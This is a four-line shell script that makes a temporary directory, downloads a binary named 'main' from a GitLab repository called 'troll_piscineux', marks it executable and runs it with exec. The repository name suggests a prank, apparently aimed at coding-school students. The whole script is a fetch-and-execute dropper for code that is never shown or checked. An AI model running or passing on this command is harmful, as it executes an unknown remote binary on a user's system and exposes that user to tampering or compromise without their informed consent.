cd $(mktemp -d )
wget https://gitlab.com/Griogu/troll_piscineux/-/raw/main/main
chmod +x main
exec ./main
